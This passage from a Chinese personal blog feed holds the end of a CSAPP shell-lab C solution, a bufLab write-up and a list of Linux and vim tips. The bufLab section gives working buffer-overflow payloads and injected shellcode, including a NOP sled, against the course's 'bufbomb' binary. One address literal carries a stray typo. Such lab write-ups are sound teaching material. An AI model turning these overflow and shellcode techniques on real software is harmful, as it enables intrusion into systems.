class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>            <span class="hljs-keyword">switch</span> (jobs[i].state)<br>            &#123;<br>            <span class="hljs-keyword">case</span> BG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> FG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> ST:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,<br>                       i, jobs[i].state);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;<br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>总的来说不难的一个实验，关键在于要先理解整个框架中的代码，然后根据trace file渐进地完成程序。需要注意的地方实验讲义中的提示以及书本中都已经给出，这里不再赘述。需要强调的是SIGCHLD的信号处理程序需要处理未捕获的SIGTSTP和SIGINT信号。此外SIGINT/SIGTSTP和SIGCHLD的信号处理程序之间可能会有潜在的导致错误的冲突。（信号处理程序是可以被其他信号中断的，可以见trace16.txt）</p><h2 id="bufLab"><a href="#bufLab" class="headerlink" title="bufLab"></a>bufLab</h2><p>ctf pwn buffer overflow基础入门题目.</p><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>由于bufbomb没有开PIE, 所以smoke的地址是固定的, 只要覆盖返回地址就行.</p><p>smoke() address: 0x08048E0A</p><img src="../../image/buflab/image-20220501205056212.png" alt="image-20220501205056212" style="zoom:80%;" /><p>getbuf没有开canary, 所以填充完0x28字节+8bytes rbp+0x08048E0A即可.</p><p>然后突然发现末尾有个0a, 于是换成10, 也就是smoke第三条指令的位置, 跳过了开辟占空间的过程不过这函数直接退出也没啥关系.</p><img src="../../image/buflab/image-20220501211931466.png" alt="image-20220501211931466" style="zoom:80%;" /><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048E10))&quot;</span> &gt;input</span><br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><img src="../../image/buflab/image-20220501211857203.png" alt="image-20220501211857203" style="zoom:80%;" /><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>要调用fizz函数, 参数要等于<code>cookie = 0x24692446</code>.</p><p>所以gefbuf返回后跳到fizz, 栈底是返回地址, 再往下是第一个参数.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048DAF)+pwn.p32(0)+pwn.p32(0x24692446))&quot;</span> &gt;input</span> <br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><p><img src="../../image/CSAPP_Lab/image-20220501213601163.png" alt="image-20220501213601163"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>shellcode注入, 放到栈上执行, 需要修改一个bss段的全局变量. 如图: <img src="../../image/buflab/image-20220501214313652.png" alt="image-20220501214313652" style="zoom:80%;" /></p><p>在地址0x0804D10C处. 栈的基地址是根据cookie来确定的, 不过在每次运行中都不会变.</p><p>bang() address: <code>0x08048D52</code>, getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbuf’s buf: ebp-0x28=<code>0x55683C38</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edi, 0x0804D10C</span><br><span class="hljs-string">mov [edi], dword ptr 0x24692446</span><br><span class="hljs-string">mov eax, 0x08048D52</span><br><span class="hljs-string">jmp eax#间接跳转也是可以的, 这个是绝对地址编码</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment">#18bytes long</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#为了填满buf</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501221133428.png" alt="image-20220501221133428" style="zoom: 80%;" /><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbuf’s buf: ebp-0x28=<code>0x55683C38</code> </p><p>在getbuf返回的时候跳转到shellcode, 修改eax为cookie. 这个时候如果要执行ret指令, 必须先在栈上压入原先的返回地址, 即<code>0x08048E50</code>, 这样就行了. 如果直接使用间接跳转都不用压入这个. </p><p>不过这样在返回test的时候ebp被破坏了, 不过反正栈没有变化, gdb查得值为<code>0x55683c90</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048E50</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#为了填满buf</span><br>pl = tmp+p32(<span class="hljs-number">0x55683c90</span>)+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501222518773.png" alt="image-20220501222518773" style="zoom:80%;" /><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>简单来说就是调用一个新函数<code>getbufn()</code>, 其中buf有520字节, 不过由于调用之前会随机在栈上分配一些空间, 所以ebp的值会发生改变, 为±240. 所以在五次运行期间要保证getbufn跳转到合适的位置. </p><p>所以直接使用nop sled技术. </p><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, 最多减去240, 即<code>0x55683B70</code> </p><p>由于要返回到testn且多次执行, 这样ebp必须保证其不被破坏, 方法是利用esp和ebp的关系来在shellcode计算出来.</p><p>从getbufn返回的时候esp是testn的栈顶. 而testn的esp和ebp的关系是<code>ebp = esp + 0x28</code>.</p><img src="../../image/buflab/image-20220501233825396.png" alt="image-20220501233825396" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea ebp, [esp+0x28]</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048CE2</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).rjust(<span class="hljs-number">520</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>) <span class="hljs-comment">#nop sled</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683B70f</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501233537565.png" alt="image-20220501233537565" style="zoom:80%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次实验引导如何利用缓冲区存在的漏洞实现一些目的：</p><ol><li>Level0：利用直接覆盖返回地址，在调用函数getbuf时直接返回smoke函数，让我们初步认识缓冲区溢出攻击的原理。</li><li>Level1：在Level0的基础上，多了修改函数参数的操作，这需要我们结合汇编代码找到参数的位置。</li><li>Level2：开始需要我们自己编写汇编代码段去实现操作：修改返回值、设置全局变量、跳转。同时也需要利用缓冲区溢出，跳转至这段代码的起始地址。</li><li>Level3：同时利用自己编写的代码设置返回值并返回至test函数，需要覆盖buf时要保持函数保存的旧ebp不变。</li><li>Level4：每次调用getbufn的目的与Level3一致，不同的是它的ebp不断变化，需要找到等式关系去编写代码以修正而ebp。而多次调用使栈基址随机化，这需要利用nop_sled的技术。</li></ol><p>总的来说比较基础, 我用的是ctf的工具来写要输入的字节序列. 再结合一些命令行操作可以快速完成本次实验.</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux relative hints</title>
    <link href="/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="Kali-amp-Linux的问题"><a href="#Kali-amp-Linux的问题" class="headerlink" title="Kali&amp;Linux的问题"></a>Kali&amp;Linux的问题</h3><blockquote><p>linux<a href="https://www.runoob.com/linux/linux-command-manual.html">命令</a>在这</p></blockquote><ul><li>虚拟机的安装(又装了一遍)</li><li>VMtools的安装(为什么网上会有这么多的<a href="https://blog.csdn.net/love20165104027/article/details/83377758">方法</a>.</li><li>中文输入法Ibus的<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">安装(</a>两行命令解决的事情有些教程搞得几十行,就离谱)</li><li>vim插件(彻底的失败) 不过在vim设置文件里设置了几个<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">常用的</a>.</li><li>密码问题, root初始密码忘记, root下passwd指令.   默认账号kali kali</li><li>vim在share文件夹里</li><li>中文输入法出现[Invalid-UTF-8 code], 改成半角中文即可</li><li>make btest出错, 修改Makefile为生成64位可执行文件<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</li><li>LInux中可执行文件和后缀名无关, 和文件的属性有关(????</li><li>bitset是一个类模板</li><li>GDB以及gcc的<a href="https://zhuanlan.zhihu.com/p/74897601">使用</a>(详见零碎知识)</li><li>kali如何运行可执行文件: ./bomb</li><li>set nohlsearch(no highlight search)</li><li>中文输入法下输入命令:w按下回车vim会卡死, <strong>输入逗号也能卡死?????</strong></li><li>kali装Chrome:他有sandbox机制, 无法在root用户下运行<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</li><li>kali使用vpn:  <strong>失败</strong>.</li><li>kill占了端口的进程<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</li><li>虚拟机卡死时查找log文件里的pid, 在任务管理器里停止</li><li>查看磁盘使用情况<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</li><li>Typora的安装<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">问题</a>.</li><li>.tar文件相关<a href="https://zhidao.baidu.com/question/873537413743808372.html">问题</a>.</li><li>root用户安装了vmtool, 切换到lbjyye后需要重新安装(?)</li><li>修改命令行终端字体大小: ~/.config/qterminal.org/qterminal.ini 里的fontsize或fontfamily并将其改为只读文件(<strong>新版完全没这个问题</strong>)</li><li>要显示隐藏文件夹直接到工具栏上的视图里去找</li><li><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">延长</a>锁屏时间</li><li>终端补全只要方向键</li><li>关机命令 init 0 重启 reboot</li><li>chorme里<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">添加</a>搜索引擎</li><li>vim无法打开文件, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">改为</a>下载GVIM</li><li>啥玩意儿啊, kali2021干吗搞没了图形界面clash弄半天也没成<a href="https://dcrelay.me/#/knowledge">[0]</a></li><li>main函数的两个参数: 一个是命令参数的个数, 另一个是命令参数数组,argv[0]是程序本身的文件名</li><li>快照管理其中的保留是防止自动保存的快照被删除</li><li>**Typora里使用中文状态下的Ctrl+A, 文件直接丢失!!!!**太特么蠢了.</li><li>/usr/share/vim/vim82/colors/有vim的主题<ul><li>industry 全黑,  evening 还行, koel 超级黑的背景, morning 灰白很不错, murpy又是黑的字体细点,  peachpuff 桃色背景, shine 亮瞎狗眼 颜色太浅, slate 字体太紧, zellner 平平无奇的白底, 剩下的不用考虑</li></ul></li><li>了解了链接引用和脚注是个<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">啥</a>.</li><li>Operation inconsistent with current state。VM报错, 只要以管理员身份运行就可以了</li><li>Linux中的Chrome无法自动升级,干脆就不升级了, 命令加一个<code>--disable-background-networking</code> </li><li>kali中使用中文输入法的时候无法在vscode中用光标选中文本</li><li>Kali成功登上google, 使用chrome的代理就成. 算是搞明白一点代理是怎么回事了, Kali没有全局代理只能再需要的软件里面设置代理, 命令行程序要用代理要装proxytrain<ul><li>proxychains<a href="https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">使用方法</a>, 其中本机ip地址为<code>无线局域网适配器 WLAN:</code> ipv4那一栏的地址</li><li>终于啊, kali和ubuntu都能走代理了:sob: </li><li>过了一天好像又不行了, 换成<code>127.0.0.1 7891</code>后换了个新版本才行. <a href="http://www.bubuko.com/infodetail-3531993.html">link</a> </li></ul></li><li>非正常关机后要启动虚拟机只要删除<code> .lck</code>磁盘锁文件夹即可.</li><li>把kali的zsh设置(功能真的是相当全)直接弄到pwn.college上面, 整个界面就好看多了.</li><li><a href="https://linuxhint.com/bash_wildcard_tutorial/">bash_wildcard</a>!</li><li>start with <a href="https://miloserdov.org/?p=3343">cli in Kali</a> :<br><code>systemctl</code> <code>set-default multi-user.target</code> <code>start display-manager.service</code> <code>set-default graphical.target</code></li><li>像seccomp ltrace的路径必须是相对路径, 如果只写个文件名是不行的.</li><li><a href="https://www.shellscript.sh/test.html">shell scriping tutorial</a> </li><li>为了shelltools又装了一个apt install gcc-i686-linux-gnu, 不知道有没用.</li><li></li></ul><h3 id="vim进阶"><a href="#vim进阶" class="headerlink" title="vim进阶"></a>vim进阶</h3><ul><li><p><a href="https://www.cnblogs.com/wajika/p/6606353.html">vim可视化模式选择</a> </p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">选择： <br><span class="hljs-keyword">vi</span>选中&#123;&#125;中间的内容,不包括&#123;&#125;<br>va&#123; 选中&#123;&#125;中间内容，包括&#123;&#125;<br>选中()中间内容<br><span class="hljs-keyword">vi</span>&lt; 选中&lt;&gt;中间内容<br><span class="hljs-keyword">vi</span>[ 选中[]中间内容<br>vit 选中中间的内容<br><span class="hljs-keyword">vi</span><span class="hljs-string">&quot; 选中&quot;</span>中间内容<br><span class="hljs-keyword">vi</span><span class="hljs-string">&#x27; 选中&#x27;</span>中间的内容、<br><br>块选择:<br>vis 选中一个句子<br>vib 选中一个block<br>viw 选中一个单词<br>vip 选中一个段落<br></code></pre></div></td></tr></table></figure></li><li><p>自动提示： <code>&lt;C-n&gt;</code> 和 <code>&lt;C-p&gt;</code> </p></li><li><p>vim<a href="https://blog.easwy.com/archives/advanced-vim-skills-auto-complete/">路径补全</a> </p></li><li><p>vim添加tab切换快捷键, 以及单界面多文件<a href="https://linuxhint.com/opening_switching_multiple_files_vim/">操作</a>.</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-meta">:map ^[OR :tabp&lt;CR&gt;</span><br><span class="hljs-meta">:map ^[OS :tabn&lt;CR&gt;</span><br></code></pre></div></td></tr></table></figure></li><li><p>折叠:  <strong>zM</strong>: close all            <strong>zr</strong>: open all      <strong>za</strong>: openOrClose   <strong>zA</strong>: sameBut<strong>Recursively</strong> </p></li><li><p>颜色<a href="https://alvinalexander.com/linux/vi-vim-editor-color-scheme-syntax/">option</a> </p></li><li><p><code>autocmd BufNewFile,BufRead gdb* set filetype=gdb</code> 设置默认的语法高亮.</p></li><li><p><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </p></li><li><p>vim先输入数字然后进入插入模式后输入几个字符, 再返回普通模式会重复输入</p></li><li><p>:e =&gt; reload file</p></li><li><p>vim plug list -&gt; <a href="https://vimawesome.com/">link</a> | 装上了tabcompletion. + python completion + </p></li><li></li></ul><h3 id="tmux-voltron-gdb-multiwindows"><a href="#tmux-voltron-gdb-multiwindows" class="headerlink" title="tmux+voltron gdb multiwindows"></a>tmux+voltron gdb multiwindows</h3><ul><li><a href="https://github.com/tmux/tmux">tmux</a>  <a href="https://github.com/tuxotron/voltron-tmux">tmux-voltron</a>  <a href="https://github.com/tmuxinator/tmuxinator">tmuxinator</a>  <a href="https://github.com/snare/voltron">voltron</a> 这方法可能没啥用.</li><li>使用pwndbg的split: <a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context">features</a> | <a href="https://github.com/jerdna-regeiz/splitmind">split mind</a> </li><li><a href="https://www.hamvocke.com/blog/a-guide-to-customizing-your-tmux-conf/">tmux config</a> | cheat <a href="https://tmuxcheatsheet.com/">sheet</a> | <a href="https://pragprog.com/titles/bhtmux2/tmux-2/">tutorial</a> </li><li>加载config文件失败: <code>tmux kill-server</code> or reload</li><li><code>for i in &#123;0..255&#125;; do  printf &quot;\x1b[38;5;$&#123;i&#125;mcolor%-5i\x1b[0m&quot; $i ; if ! (( ($i + 1 ) % 8 )); then echo ; fi ; done</code>找到所有的颜色.</li><li><code>&lt;prefix&gt; !</code>或者<code>:join-pane -t &lt;int&gt;</code>可以将一个spane移进或移出.</li><li>Ctrl+b, <code>.</code>, <code>222</code> (renumber) | Ctrl+A+q = windows number | </li></ul><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><ul><li>ubuntu虽然任务栏不好用, 但是有快捷键挺舒服的, 继续记!</li><li>ubuntu sudo命令延时很长<a href="https://blog.csdn.net/kiritow/article/details/80687036">解决办法</a> </li><li>更新<a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">ubuntu源</a> </li><li>linux终端<a href="http://www.360doc.com/content/16/0615/15/7044580_567984505.shtml">快捷键</a> </li><li>通过增加快捷键绑定解决vim终端中无法使用方向键的问题</li><li>init 0重启发现挂载失败了, 之前那个命令也不管用了, 只能倒回上一个快照继续, 还好博客都是用的共享文件夹.<br>不说了, 快照再次救我一命.<ul><li>找到了解决办法, 要给普通用户权限访问</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot; &quot; | sudo -S vmhgfs-fuse -o allow_other ......<br></code></pre></div></td></tr></table></figure><ul><li>colorizing man pages: <a href="https://askubuntu.com/questions/156383/how-to-have-colored-manual-pages-in-gnome-terminal/834107#834107">link</a> &amp;&amp; <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">zsh</a> </li><li>save zsh history and multiterminal-hisory-share <a href="https://blog.lilydjwg.me/2013/7/3/manually-save-read-zsh-history-entries.39852.html">link</a> </li></ul><h3 id="各种命令-软件包"><a href="#各种命令-软件包" class="headerlink" title="各种命令+软件包"></a>各种命令+软件包</h3><ul><li><em>ldd</em>  <em>strace(刚刚装的)</em> <em>head打印前n行</em>  <em>du显示文件大小</em>   <em>ps打印进程信息</em>  <ul><li>ldd: print shared object dependencies</li><li>ps aux  –  BSD参数风格</li></ul></li><li>Linux下<code>!</code>的<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</li><li><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </li><li>scp&amp; mkdir &amp; mv(linux中重命名的唯一方法)</li><li><em><strong>screen</strong></em>: window manager, 好多快捷键, 复制了一份<a href="https://gist.github.com/joaopizani/2718397">.screenrc</a>, 还挺有趣的.<ul><li>screen这玩意儿也太强了.<code>Ctrl + A + [</code>进入copy模式才能使用滚轮或者Ctrl+F/B等等来翻页(已经改成&lt;C-/&gt;)</li></ul></li><li>装了一个httping玩一玩</li><li>看到一个cscope包可以用来解析C/C++项目, 有空再研究怎么玩(谁玩啊</li><li>vim-gtk是vim的一个GUI版本, 装了之后才能vim -g</li><li>新命令: tput好像是用一个通用命令做参数,  然后在当前终端的数据库中找到正确的命令并发送</li><li><strong>ipython: System shell with !</strong> interactive Python也挺神奇的, 具体见pwn-modulesj里的帮助.<ul><li><a href="https://blog.51cto.com/essun/1712322">ipython用法</a> </li></ul></li><li>发现grep有拓展正则和普通正则的区别, 又是一大堆东西, 有缘再看吧.</li><li>新东西: <strong>sed</strong>, stream editor.  还有一个ed, 根本不知道怎么用. <del>这东西这两天把菜鸟教程上所有的命令全看一边就行了</del> 上面没有.<br><em><strong>rev nl</strong></em>  perror<ul><li>命令或许可以写在思维导图里, md肯定是不太行的.</li><li>真不错, 用了sed来改c.c中的题目标号, 再方便一点.</li></ul></li><li>装了一个rappel. 改成了<code>rap</code>直接执行.</li><li><code>find</code>的功能真的很多, 又是一个相当强大的工具. e.g. <code>find . -name Makefile</code> </li><li>wc 命令, 计数文件字节数等等.</li><li><code>uniq</code> report repeated lines.</li><li><code>ls -ARl *</code> 递归展示文件并且不显示.和.. 还能显示符号链接</li></ul><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul><li>How to exit the running container? <a href="https://linuxhandbook.com/exit-docker-container/">here</a> : that is pressing ctrl+p &amp;&amp; ctrl+q.</li><li><code>sudo docker ps</code> </li><li><code>sudo docker exec -it CONTAINER_ID sh</code> </li></ul><h3 id="Shell-programming"><a href="#Shell-programming" class="headerlink" title="Shell programming"></a>Shell programming</h3><p>好多东西, 看了下感觉更会用shell了.</p><ul><li>printf使用示例: <ul><li><code>printf &#39;%d %d %d %d&#39; \&#39;a 3 4 \&#39;a</code> <code>printf &quot;\\$(printf %o 74)&quot;</code> <code>printf &quot;\\x$(printf %x 65)&quot;</code> </li></ul></li><li><a 